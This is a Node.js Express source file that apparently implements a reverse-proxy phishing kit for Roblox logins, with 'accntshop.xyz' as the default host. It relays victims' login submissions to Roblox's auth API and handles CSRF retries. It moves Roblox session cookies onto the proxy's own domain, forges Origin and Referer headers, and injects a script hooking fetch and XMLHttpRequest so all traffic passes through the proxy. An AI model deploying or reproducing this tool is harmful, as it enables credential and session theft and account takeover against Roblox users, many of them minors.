const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const https = require('https');

const app = express();

console.log('='.repeat(60));
console.log('🔒 PURE LOGIN PROXY - FIXED COOKIE DOMAIN');
console.log('='.repeat(60));

// Domain map
const SUBDOMAIN_MAP = {
    'auth-api':       'https://auth.roblox.com',
    'apis-api':       'https://apis.roblox.com',
    'api-api':        'https://api.roblox.com',
    'economy-api':    'https://economy.roblox.com',
    'users-api':      'https://users.roblox.com',
    'catalog-api':    'https://catalog.roblox.com',
    'games-api':      'https://games.roblox.com',
    'thumbnails-api': 'https://thumbnails.roblox.com',
    'ecsv2-api':      'https://ecsv2.roblox.com',
    'js-cdn':         'https://js.rbxcdn.com',
    'css-cdn':        'https://css.rbxcdn.com',
    'images-cdn':     'https://images.rbxcdn.com',
    'static-cdn':     'https://static.rbxcdn.com',
    'rbxcdn':         'https://www.rbxcdn.com',
    'content-cdn':    'https://content.roblox.com',
};

const CDN_PREFIXES = new Set(['js-cdn', 'css-cdn', 'images-cdn', 'static-cdn', 'rbxcdn', 'content-cdn']);

const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';

// =========================
// Helpers
// =========================
function rewriteCookies(cookies, host) {
    if (!cookies) return cookies;
    return cookies.map(cookie => {
        return cookie
            .replace(/Domain=\.?roblox\.com/gi, `Domain=.${host}`)
            .replace(/\bSecure\b/gi, 'Secure; SameSite=None');
    });
}

function setCorsHeaders(proxyRes, req) {
    delete proxyRes.headers['access-control-allow-origin'];
    delete proxyRes.headers['access-control-allow-credentials'];
    delete proxyRes.headers['access-control-allow-methods'];
    delete proxyRes.headers['access-control-allow-headers'];
    delete proxyRes.headers['access-control-expose-headers'];

    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    proxyRes.headers['access-control-allow-origin'] = origin;
    proxyRes.headers['access-control-allow-credentials'] = 'true';
    proxyRes.headers['access-control-allow-methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
    proxyRes.headers['access-control-allow-headers'] = 'Content-Type, x-csrf-token, Authorization, rbx-device-id';

    if (proxyRes.headers['x-csrf-token']) {
        proxyRes.headers['access-control-expose-headers'] = 'x-csrf-token';
    }
}

// Pretty-print a response body for logging — truncate if huge
function logBody(label, status, body) {
    let parsed = body;
    try { parsed = JSON.stringify(JSON.parse(body), null, 2); } catch (_) {}
    const truncated = parsed.length > 800 ? parsed.slice(0, 800) + '\n   ...(truncated)' : parsed;
    console.log(`   ${label} [${status}] body:\n${truncated.split('\n').map(l => '     ' + l).join('\n')}`);
}

// =========================
// Server-side CSRF login handler
// =========================
function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
    return new Promise((resolve, reject) => {
        const bodyBuf = Buffer.from(bodyStr, 'utf8');

        const headers = {
            'Content-Type':   'application/json;charset=UTF-8',
            'Content-Length': bodyBuf.length,
            'Accept':         'application/json, text/plain, */*',
            'Accept-Language':'en-US,en;q=0.9',
            'Origin':         'https://www.roblox.com',
            'Referer':        'https://www.roblox.com/login',
            'User-Agent':     ua || BROWSER_UA,
        };

        const forwardHeaders = ['rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token'];
        for (const h of forwardHeaders) {
            if (extraHeaders[h]) headers[h] = extraHeaders[h];
        }

        if (cookieHeader) headers['Cookie'] = cookieHeader;
        if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;

        console.log(`   → POST auth.roblox.com/v2/login | CSRF: ${csrfToken ? csrfToken.slice(0,8)+'...' : 'none'} | Cookie: ${cookieHeader ? 'yes' : 'none'} | Body: ${bodyBuf.length}b`);

        const options = {
            hostname: 'auth.roblox.com',
            path:     '/v2/login',
            method:   'POST',
            headers,
        };

        const reqOut = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({
                status:  res.statusCode,
                headers: res.headers,
                body:    data,
            }));
        });

        reqOut.on('error', reject);
        reqOut.write(bodyBuf);
        reqOut.end();
    });
}

// Intercept login POST
app.use('/auth-api/v2/login', express.json({ type: '*/*' }), async (req, res, next) => {
    if (req.method !== 'POST') return next();

    const host            = req.headers.host || 'accntshop.xyz';
    const ua              = req.headers['user-agent'] || BROWSER_UA;
    const incomingCookies = req.headers['cookie'] || '';
    const origin          = req.headers['origin'] || `https://${host}`;

    console.log('🔑 LOGIN ATTEMPT (server-side CSRF handler)');

    try {
        const bodyStr = JSON.stringify(req.body);

        // Step 1
        const first = await doLoginRequest(bodyStr, incomingCookies, null, ua, req.headers);
        console.log(`   Step 1 response: ${first.status} | CSRF in resp: ${first.headers['x-csrf-token'] ? 'YES' : 'NO'}`);
        if (first.status !== 403 || !first.headers['x-csrf-token']) {
            logBody('Step 1', first.status, first.body);
        }

        let finalResponse = first;

        if (first.status === 403 && first.headers['x-csrf-token']) {
            const csrfToken = first.headers['x-csrf-token'];

            let cookieHeader = incomingCookies;
            if (first.headers['set-cookie']) {
                const extra = first.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
                cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
            }

            // Step 2
            const second = await doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, req.headers);
            console.log(`   Step 2 response: ${second.status}`);
            logBody('Step 2', second.status, second.body);
            finalResponse = second;

            // Step 3 — token rotated
            if (second.status === 403 && second.headers['x-csrf-token'] && second.headers['x-csrf-token'] !== csrfToken) {
                const csrfToken2 = second.headers['x-csrf-token'];
                console.log(`   Token rotated — Step 3 retry with: ${csrfToken2.slice(0,8)}...`);

                if (second.headers['set-cookie']) {
                    const extra = second.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
                    cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
                }

                const third = await doLoginRequest(bodyStr, cookieHeader, csrfToken2, ua, req.headers);
                console.log(`   Step 3 response: ${third.status}`);
                logBody('Step 3', third.status, third.body);
                finalResponse = third;
            }
        }

        const finalCookies = finalResponse.headers['set-cookie'];
        const rewritten    = rewriteCookies(finalCookies, host);

        res.status(finalResponse.status);
        res.set('Content-Type', 'application/json');
        res.set('Access-Control-Allow-Origin', origin);
        res.set('Access-Control-Allow-Credentials', 'true');

        if (finalResponse.headers['x-csrf-token']) {
            res.set('X-CSRF-TOKEN', finalResponse.headers['x-csrf-token']);
            res.set('Access-Control-Expose-Headers', 'x-csrf-token');
        }
        if (rewritten && rewritten.length) {
            res.set('Set-Cookie', rewritten);
        }

        if (finalResponse.status === 200) {
            console.log(`✅ LOGIN SUCCESS`);
        } else {
            console.log(`❌ LOGIN FAILED — final status: ${finalResponse.status}`);
        }

        res.send(finalResponse.body);

    } catch (err) {
        console.error('[login] Error:', err.message);
        res.status(502).send('Proxy error');
    }
});

function buildInjectedScript(host) {
    const domainEntries = Object.entries(SUBDOMAIN_MAP)
        .map(([prefix, target]) => `[${JSON.stringify(target)}, ${JSON.stringify(`https://${host}/${prefix}`)}]`)
        .join(',\n');

    return `<script>
(function() {
    var PROXY_HOST = ${JSON.stringify(`https://${host}`)};
    var DOMAIN_MAP = [
        ${domainEntries},
        ["https://www.roblox.com", PROXY_HOST],
        ["http://www.roblox.com",  PROXY_HOST],
        ["https://roblox.com",     PROXY_HOST],
        ["http://roblox.com",      PROXY_HOST]
    ];

    function rewriteUrl(url) {
        if (!url || typeof url !== 'string') return url;
        for (var i = 0; i < DOMAIN_MAP.length; i++) {
            var from = DOMAIN_MAP[i][0];
            var to   = DOMAIN_MAP[i][1];
            if (url.indexOf(from) === 0) {
                return to + url.slice(from.length);
            }
        }
        return url;
    }

    var _fetch = window.fetch;
    window.fetch = function(resource, init) {
        if (typeof resource === 'string') resource = rewriteUrl(resource);
        else if (resource && resource.url) resource = new Request(rewriteUrl(resource.url), resource);
        return _fetch.call(this, resource, init);
    };

    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        var args = Array.prototype.slice.call(arguments);
        args[1] = rewriteUrl(url);
        return _open.apply(this, args);
    };
})();
</script>`;
}

function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function rewriteUrls(body, host) {
    let result = body;

    for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
        const domain = target.replace(/^https?:/, '');
        result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${host}/${prefix}`);
        result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${host}/${prefix}`);
    }

    result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${host}`);
    result = result.replace(/\/\/www\.roblox\.com/g, `//${host}`);
    result = result.replace(/https?:\/\/roblox\.com/g, `https://${host}`);

    return result;
}

// =========================
// Logging middleware — includes response status
// =========================
app.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        const ms = Date.now() - start;
        console.log(`[${new Date().toISOString()}] ${req.method} ${req.path} → ${res.statusCode} (${ms}ms)`);
    });
    next();
});

// =========================
// OPTIONS preflight
// =========================
app.options('*', (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    res.set({
        'access-control-allow-origin': origin,
        'access-control-allow-credentials': 'true',
        'access-control-allow-methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'access-control-allow-headers': 'Content-Type, x-csrf-token, Authorization, rbx-device-id',
        'access-control-max-age': '86400',
    });
    res.sendStatus(200);
});

// =========================
// AUTH API
// =========================
app.use('/auth-api', createProxyMiddleware({
    target: 'https://auth.roblox.com',
    changeOrigin: true,
    secure: true,
    pathRewrite: { '^/auth-api': '' },
    proxyTimeout: 10000,
    timeout: 10000,

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('origin', 'https://www.roblox.com');
            proxyReq.setHeader('referer', 'https://www.roblox.com/login');
            proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
            if (req.headers['x-csrf-token']) {
                proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
            }
        },

        proxyRes: (proxyRes, req) => {
            if (proxyRes.headers['set-cookie']) {
                const host = req.headers.host || 'accntshop.xyz';
                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
            }
            setCorsHeaders(proxyRes, req);
        },

        error: (err, req, res) => {
            console.error(`[auth-api] ❌ ${req.method} ${req.path}`);
            console.error(`   Error code   : ${err.code || 'N/A'}`);
            console.error(`   Error message: ${err.message}`);
            console.error(`   Error stack  : ${err.stack ? err.stack.split('\n')[1] : 'N/A'}`);
            res.status(502).send('Proxy error');
        }
    }
}));

// =========================
// APIS API
// =========================
app.use('/apis-api', createProxyMiddleware({
    target: 'https://apis.roblox.com',
    changeOrigin: true,
    secure: true,
    pathRewrite: { '^/apis-api': '' },
    proxyTimeout: 10000,
    timeout: 10000,

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('origin', 'https://www.roblox.com');
            proxyReq.setHeader('referer', 'https://www.roblox.com/login');
            proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
            if (req.headers['x-csrf-token']) {
                proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
            }
        },

        proxyRes: (proxyRes, req) => {
            if (proxyRes.headers['set-cookie']) {
                const host = req.headers.host || 'accntshop.xyz';
                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
            }
            setCorsHeaders(proxyRes, req);
        },

        error: (err, req, res) => {
            console.error(`[apis-api] ❌ ${req.method} ${req.path}`);
            console.error(`   Error code   : ${err.code || 'N/A'}`);
            console.error(`   Error message: ${err.message}`);
            console.error(`   Error stack  : ${err.stack ? err.stack.split('\n')[1] : 'N/A'}`);
            res.status(502).send('Proxy error');
        }
    }
}));

// =========================
// OTHER APIS
// =========================
for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
    if (prefix === 'auth-api' || prefix === 'apis-api') continue;

    app.use(`/${prefix}`, createProxyMiddleware({
        target,
        changeOrigin: true,
        secure: true,
        pathRewrite: { [`^/${prefix}`]: '' },
        proxyTimeout: 10000,
        timeout: 10000,

        on: {
            proxyReq: (proxyReq, req) => {
                proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
            },

            proxyRes: (proxyRes, req) => {
                setCorsHeaders(proxyRes, req);
            },

            error: (err, req, res) => {
                console.error(`[${prefix}] ❌ ${req.method} ${req.path}`);
                console.error(`   Error code   : ${err.code || 'N/A'}`);
                console.error(`   Error message: ${err.message}`);
                console.error(`   Error stack  : ${err.stack ? err.stack.split('\n')[1] : 'N/A'}`);
                res.status(502).send('Proxy error');
            }
        }
    }));
}

// =========================
// MAIN SITE
// =========================
app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    proxyTimeout: 10000,
    timeout: 10000,

    pathRewrite: (path) => (path === '/' ? '/login' : path),

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
        },

        proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
            const ct = proxyRes.headers['content-type'] || '';

            if (ct.includes('text/html')) {
                const host = req.headers.host;
                let body = buffer.toString('utf8');

                body = rewriteUrls(body, host);

                const script = buildInjectedScript(host);
                body = body.replace('<head', `<head>${script}`);

                return body;
            }

            return buffer;
        }),

        error: (err, req, res) => {
            console.error(`[main] ❌ ${req.method} ${req.path}`);
            console.error(`   Error code   : ${err.code || 'N/A'}`);
            console.error(`   Error message: ${err.message}`);
            res.status(502).send('Proxy error');
        }
    }
}));

// =========================
// START SERVER
// =========================
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Proxy running on port ${PORT}`);
});
